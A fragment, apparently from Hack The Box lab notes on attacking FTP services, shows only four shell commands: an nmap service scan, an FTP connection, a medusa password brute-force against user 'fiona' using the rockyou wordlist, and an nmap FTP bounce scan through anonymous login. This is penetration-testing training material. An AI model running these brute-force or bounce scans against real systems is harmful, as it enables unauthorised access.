...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ ftp 192.168.2.142    
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
